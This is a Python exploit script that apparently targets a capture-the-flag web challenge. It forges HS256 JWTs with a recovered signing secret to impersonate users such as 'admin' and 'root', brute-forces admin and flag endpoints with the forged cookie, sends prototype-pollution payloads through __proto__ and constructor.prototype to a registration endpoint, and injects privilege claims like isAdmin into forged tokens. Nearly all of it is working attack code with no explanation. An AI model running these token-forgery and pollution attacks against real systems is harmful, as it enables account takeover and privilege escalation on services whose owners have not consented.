import base64
import json
import requests
import hmac
import hashlib

URL = "https://mnbvcxzasdfgh-csc26.cybersecuritychallenge.al"

# JWT Secret found!
JWT_SECRET = "16f237faf903a49a3e6b7a5261fc3ac4289ffb4634df4adbe07501469fd57c9c5a6b154a4fe3c5ed51fd21a31c1132d1e14a19f269b1851bb42cad005e4c26c7"

def b64e(d):
    return base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode()).decode().rstrip('=')

def forge_token(username, iat=1769776334):
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"username": username, "iat": iat}
    msg = f"{b64e(header)}.{b64e(payload)}"
    sig = hmac.new(JWT_SECRET.encode(), msg.encode(), hashlib.sha256).digest()
    return f"{msg}.{base64.urlsafe_b64encode(sig).decode().rstrip('=')}"

# Try accessing profile for different users - maybe flag user exists
print("=== Trying different usernames ===")
usernames = [
    "admin", "flag", "root", "ctf", "FLAG", "CSC26", "csc26",
    "administrator", "system", "super", "superadmin",
    "flag_user", "flaguser", "theFlag", "the_flag",
]

for uname in usernames:
    token = forge_token(uname)
    r = requests.get(f"{URL}/profile", cookies={"token": token})
    if "Welcome" in r.text:
        bio_start = r.text.find("<strong>Bio:</strong>")
        bio_end = r.text.find("</p>", bio_start)
        bio = r.text[bio_start:bio_end]
        print(f"{uname}: {bio}")
        if "csc26" in r.text.lower() or "flag" in bio.lower():
            print(f"\n[+] FLAG FOUND for user {uname}!")
            print(r.text)

# Maybe the flag is on a different page for admin
print("\n=== Exploring with admin token ===")
admin_token = forge_token("admin")

endpoints = [
    "/", "/profile", "/admin", "/dashboard", "/panel", "/flag",
    "/api", "/api/flag", "/api/admin", "/api/profile",
    "/secret", "/hidden", "/private",
    "/admin/flag", "/admin/profile", "/admin/users",
]

for ep in endpoints:
    r = requests.get(f"{URL}{ep}", cookies={"token": admin_token})
    if "csc26" in r.text.lower() or "flag" in r.text.lower():
        print(f"[+] Possible flag at {ep}:")
        print(r.text[:500])
    elif r.status_code == 200 and "Cannot" not in r.text:
        print(f"[+] {ep}: {r.text[:100].replace(chr(10), ' ')}")

# Maybe there's prototype pollution that works now with JWT understanding
# Let's pollute the bio field via __proto__
print("\n=== Prototype pollution with new understanding ===")

# Register with JSON body trying to pollute bio
s = requests.Session()
# Login to get a valid session
s.post(f"{URL}/login", data={"username": "alpet123", "password": "alpet123"})

# Maybe we can pollute bio for all users via __proto__
import threading
import time

# First: register a polluter user that sets __proto__.bio
pollute_payloads = [
    {"username": "polluter_a1", "password": "polluter_a1", "__proto__": {"bio": "POLLUTED_BIO_1"}},
    {"username": "polluter_a2", "password": "polluter_a2", "constructor": {"prototype": {"bio": "POLLUTED_BIO_2"}}},
]

for payload in pollute_payloads:
    r = requests.post(f"{URL}/register", json=payload, headers={"Content-Type": "application/json"})
    print(f"Pollute attempt: {r.status_code}")

# Now check admin's bio again
r = requests.get(f"{URL}/profile", cookies={"token": admin_token})
print(f"\nAdmin bio after pollution: {r.text}")

# Maybe we need to set isAdmin in the JWT payload
print("\n=== Adding extra claims to JWT ===")
extra_claims = [
    {"username": "admin", "iat": 1769776334, "isAdmin": True},
    {"username": "admin", "iat": 1769776334, "role": "admin"},
    {"username": "admin", "iat": 1769776334, "admin": True},
    {"username": "admin", "iat": 1769776334, "bio": "csc26{test}"},
]

for claims in extra_claims:
    header = {"alg": "HS256", "typ": "JWT"}
    msg = f"{b64e(header)}.{b64e(claims)}"
    sig = hmac.new(JWT_SECRET.encode(), msg.encode(), hashlib.sha256).digest()
    token = f"{msg}.{base64.urlsafe_b64encode(sig).decode().rstrip('=')}"
    
    r = requests.get(f"{URL}/profile", cookies={"token": token})
    if "csc26" in r.text or "INJECTED" in r.text:
        print(f"[+] Extra claim worked: {claims}")
        print(r.text)
    else:
        bio_start = r.text.find("<strong>Bio:</strong>")
        bio_end = r.text.find("</p>", bio_start)
        print(f"Claims {list(claims.keys())}: {r.text[bio_start:bio_end] if bio_start > 0 else 'N/A'}")
